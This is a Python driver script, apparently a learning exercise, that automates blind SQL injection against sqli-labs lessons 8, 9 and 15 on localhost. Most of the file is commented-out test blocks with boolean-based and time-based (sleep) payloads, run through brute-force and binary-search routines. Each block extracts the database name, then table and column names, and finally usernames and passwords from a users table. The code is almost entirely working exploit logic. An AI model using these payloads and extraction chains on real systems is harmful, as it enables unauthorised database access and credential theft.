import time_based
import bool_based
# url = "http://127.0.0.1/sqli-labs/Less-8/"     # 测试less8
# uname=admin' and substr(database(),1,1)='s' #	&passwd=123456&submit=Submit                            # 测试less15
#dict_para_data = {
#    'uname':'admin',
#    'passwd':'123',
#   'submit':'Submit'
#}

# inject_type: 1.布尔盲注2.时间注入
# http_type：1.GET请求2.POST请求
# dict_para_data：所有的参数，和默认值
# vuln_para：注入的参数
# payloads：注入的内容

if __name__ == '__main__':
    # payloads = ["admin' and substr(database()," , ",1)='" , "' #"]      # 测试less15使用的payloads

    # 布尔注入get测试
    '''
    dict_para_data = {
        'id' : 'hack123'
    }
    vuln_para = 'id'
    http_type = 1
    inject_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-8/"
    expected_data = 'are in'
    payload_foo1 = "1' and substr(str_foo,int_foo,1)='char_foo' and '1'='1"
    payload_foo2 = "1' and str_foo=int_foo and '1'='1"
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    loop_freq1 = 20
    
    # 爆库
    db_len = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, str_foo2, 40)
    db_result = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),' ')) FROM security.users)"
    data_len =  bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, data_foo7, 200)
    
    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),' ') FROM security.users)"
    data = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, data_foo8, 188+1)
    '''
    '''
    # 布尔注入二分法GET测试
    dict_para_data = {
        'id' : 'hack123'
    }
    vuln_para = 'id'
    http_type = 1
    inject_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-8/"
    expected_data = 'are in'
    payload_foo1 = "1' and char_foo>ascii(substr(str_foo,int_foo,1)) and '1'='1"
    payload_foo2 = "1' and int_foo>str_foo and '1'='1"
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    db_len = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, str_foo2, 0)
    db_result = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),'/')) FROM security.users)"
    data_len =  bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, data_foo7, 200)
    
    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),'/') FROM security.users)"
    data = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, data_foo8, 188+1)
    '''
    '''
    # 布尔注入二分法POST测试
    dict_para_data = {
        'uname':'admin',
        'passwd':'123',
        'submit':'Submit'
    }
    vuln_para = 'uname'
    http_type = 2
    inject_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-15/"
    expected_data = 'flag.jpg'
    payload_foo1 = "admin' and char_foo>ascii(substr(str_foo,int_foo,1)) #"
    payload_foo2 = "admin' and int_foo>str_foo#"
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    db_len = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, str_foo2, 0)
    db_result = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),'/')) FROM security.users)"
    data_len =  bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, data_foo7, 200)
    
    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),'/') FROM security.users)"
    data = bool_based.binary_search_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, data_foo8, 188+1)
    '''
    '''
    # 时间注入二分法post
    dict_para_data = {
        'uname':'admin',
        'passwd':'123',
        'submit':'Submit'
    }
    vuln_para = 'uname'
    http_type = 2
    inject_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-15/"
    expected_time = 1
    #payload_foo1 = "admin' and char_foo>ascii(substr(str_foo,int_foo,1)) #"
    payload_foo1 = "admin' and if(ascii(substr(str_foo,int_foo,1))<char_foo,sleep(1),1) #"
    payload_foo2 = "admin' and if(str_foo<int_foo,sleep(1),1) #"
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    db_len = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, str_foo2, 0)
    db_result = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),'/')) FROM security.users)"
    data_len =  time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, data_foo7, 200)
    
    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),'/') FROM security.users)"
    data = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, data_foo8, 188+1)
    '''
    '''
    # 时间注入二分法get
    dict_para_data = {
        'id':'hack123',
    }
    vuln_para = 'id'
    http_type = 1
    inject_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-8/"
    expected_time = 1
    #payload_foo1 = "admin' and char_foo>ascii(substr(str_foo,int_foo,1)) #"
    payload_foo1 = "1' and if(ascii(substr(str_foo,int_foo,1))<char_foo,sleep(1),1) and '1'='1"
    payload_foo2 = "1' and if(str_foo<int_foo,sleep(1),1) and '1'='1"
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    db_len = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, str_foo2, 0)
    db_result = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),'/')) FROM security.users)"
    data_len =  time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, data_foo7, 200)
    
    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),'/') FROM security.users)"
    data = time_based.binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, data_foo8, 188+1)
    '''
    # 布尔注入POST测试
    '''
    dict_para_data = {
        'uname':'admin',
        'passwd':'123',
        'submit':'Submit'
    }
    vuln_para = 'uname'
    http_type = 2
    inject_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-15/"
    expected_data = 'flag.jpg'
    payload_foo2 = "admin' and str_foo=int_foo #"
    payload_foo1 = "admin' and substr(str_foo,int_foo,1)='char_foo' #" 

    str_foo1 = "database()"
    str_foo2 = "length(database())"
    loop_freq1 = 20


    # 爆库
    db_len = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, str_foo2, 40)
    db_result = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, str_foo1, db_len+1)
    
     # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),' ')) FROM security.users)"
    data_len =  bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo2, data_foo7, 200)

    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),' ') FROM security.users)"
    data = bool_based.brute_enum_by_bool(dict_para_data, vuln_para, http_type,  url, expected_data, payload_foo1, data_foo8, data_len+1)
    '''

    # 时间注入get测试
    '''
    dict_para_data = {
        'id': 'hack123'
    }
    vuln_para = 'id'
    http_type = 1
    url = "http://127.0.0.1/sqli-labs/Less-9/"
    expected_time = 1
    payloads = [
        "1' and if(substr(database(),",
        ",1)='",
        "',sleep(1),1) and '1'='1"
    ]
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    payload_foo1 = "1' and if(substr(str_foo,int_foo,1)='char_foo',sleep(1),1) and '1'='1"
    payload_foo2 = "1' and if(str_foo=int_foo,sleep(1),1) and '1'='1"
    # 爆库

    db_len = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, str_foo2, 40)
    db_result = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),' ')) FROM security.users)"
    data_len =  time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type,url, expected_time, payload_foo2, data_foo7, 200)

    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),' ') FROM security.users)"
    data = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type,url, expected_time, payload_foo1, data_foo8, data_len+1)
    '''
    
    # 时间注入POST测试
    '''
    dict_para_data = {
        'uname':'admin',
        'passwd':'123',
        'submit':'Submit'
    }
    vuln_para = 'uname'
    http_type = 2
    url = "http://127.0.0.1/sqli-labs/Less-15/"
    expected_time = 1
   
    str_foo1 = "database()"
    str_foo2 = "length(database())"
    payload_foo1 = "admin' and if(substr(str_foo,int_foo,1)='char_foo',sleep(1),1) #"
    payload_foo2 = "admin' and if(str_foo=int_foo,sleep(1),1) #"
    # 爆库
    
    db_len = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, str_foo2, 40)
    db_result = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, str_foo1, db_len+1)

    # 表长度
    tables_foo3 = "(SELECT CHAR_LENGTH(group_concat(table_name)) AS result_length FROM information_schema.tables WHERE table_schema='" + db_result + "')"
    tb_len =  time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, tables_foo3, 40)

    # 表名
    tables_foo4 = "(SELECT group_concat(table_name) from information_schema.tables where table_schema='" + db_result + "')"
    tb_result = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, tables_foo4, tb_len+1)

    # 字段长度
    colu_foo5 = "(select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_len = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo2, colu_foo5, 40)

    # 字段名
    colu_foo6 = "(select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')"
    colu_result = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo1, colu_foo6, colu_len+1)

    # 所有数据长度
    data_foo7 = "(SELECT CHAR_LENGTH(GROUP_CONCAT(CONCAT(username, ',', password),' ')) FROM security.users)"
    data_len =  time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type,url, expected_time, payload_foo2, data_foo7, 200)

    # 所有数据
    data_foo8 = "(SELECT GROUP_CONCAT(CONCAT(username, ',', password),' ') FROM security.users)"
    data = time_based.brute_enum_by_time(dict_para_data, vuln_para, http_type,url, expected_time, payload_foo1, data_foo8, data_len+1)
    '''